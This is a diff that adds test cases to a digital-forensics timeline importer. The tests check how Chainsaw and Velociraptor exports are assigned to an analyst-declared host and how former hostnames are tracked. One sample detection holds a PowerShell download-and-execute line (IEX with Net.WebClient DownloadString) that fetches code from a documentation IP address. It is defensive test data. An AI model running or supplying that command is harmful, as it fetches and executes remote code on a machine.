@@ -191,3 +191,97 @@ describe("importVelociraptor — a rename learned by one file reaches the case a
     expect(hbRows.map((e) => e.asset)).toEqual([NEW]);
   });
 });
+
+// The analyst's "asset for this import" (#1496): a bare export imported with a declared host lands
+// on that host, old names become former names, the ledger records the pair with basis "analyst",
+// and a later bare file with no declaration folds through the ledger.
+describe("importChainsaw / importVelociraptor — an analyst-declared host (#1496)", () => {
+  const bareChainsaw = JSON.stringify([
+    {
+      EventTime: "2025-12-05T03:02:24Z",
+      Detection: "Malicious PowerShell Keywords",
+      Severity: "high",
+      "Rule Group": "Sigma",
+      Computer: OLD,
+      Channel: "Microsoft-Windows-PowerShell/Operational",
+      EventID: 4104,
+      SystemData: {
+        Computer: OLD,
+        EventID: 4104,
+        TimeCreated_attributes: { SystemTime: "2025-12-05T03:02:24Z" },
+      },
+      EventData: {
+        ScriptBlockText: "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.7/a')",
+      },
+    },
+    // A verdict-only detection with no embedded event goes through the same host logic.
+    {
+      group: "Sigma",
+      kind: "individual",
+      name: "Suspicious Thing",
+      level: "medium",
+      timestamp: "2025-12-05T03:02:25Z",
+      Computer: OLD,
+    },
+  ]);
+
+  it("lands every row on the declared host with the former-name note, and writes an analyst record", async () => {
+    const { p } = await pipeline();
+    const state = await p.importChainsaw("c1", bareChainsaw, {
+      label: "chainsaw.json",
+      idPrefix: "c",
+      importedAt: IMPORTED_AT,
+      chainsaw: { hostFallback: NEW, hostFallbackBasis: "analyst" },
+    });
+    const rows = state.forensicTimeline.filter((e) => e.description.startsWith("Chainsaw"));
+    expect(rows.length).toBeGreaterThanOrEqual(2);
+    for (const r of rows) {
+      expect(r.asset).toBe(NEW);
+      expect(r.description).toContain(`[logged under former hostname ${OLD}]`);
+      expect(r.assetRecord).toBeUndefined(); // a declared host is a collector identity: no later ledger may move it
+    }
+    expect(state.hostRenames).toEqual([
+      { formerName: OLD, currentName: NEW, until: "2025-12-05T03:02:25.000Z", basis: "analyst" },
+    ]);
+    expect(state.collectorHostnames).toEqual([NEW]);
+  });
+
+  it("a later bare file with NO declaration folds through what the declaration taught", async () => {
+    const { p } = await pipeline();
+    await p.importChainsaw("c1", bareChainsaw, {
+      label: "chainsaw.json",
+      idPrefix: "c",
+      importedAt: IMPORTED_AT,
+      chainsaw: { hostFallback: NEW, hostFallbackBasis: "analyst" },
+    });
+    const after = await p.importVelociraptor("c1", BARE, {
+      label: "evtx.json",
+      idPrefix: "b",
+      importedAt: IMPORTED_AT,
+    });
+    expect(bareRows(after)[0].asset).toBe(NEW);
+  });
+
+  it("a row that names its own Fqdn is never overridden by the declaration", async () => {
+    const { p } = await pipeline();
+    const withFqdn = JSON.stringify([
+      {
+        _Source: "Windows.EventLogs.Evtx",
+        Fqdn: "ws02.example.com",
+        Computer: "WS02",
+        EventTime: "2026-01-01T00:00:00Z",
+        System: { Computer: "WS02", EventID: { Value: 4624 }, Channel: "Security" },
+        EventData: { TargetUserName: "bob", LogonType: "3", IpAddress: "10.0.0.5" },
+      },
+    ]);
+    const state = await p.importVelociraptor("c1", withFqdn, {
+      label: "evtx.json",
+      idPrefix: "v",
+      importedAt: IMPORTED_AT,
+      velociraptor: { hostFallback: NEW, hostFallbackBasis: "analyst" },
+    });
+    const row = state.forensicTimeline.find((e) => e.description.includes("4624"));
+    expect(row?.asset).toBe("ws02.example.com");
+    expect(state.hostRenames ?? []).toEqual([]);
+  });
+});
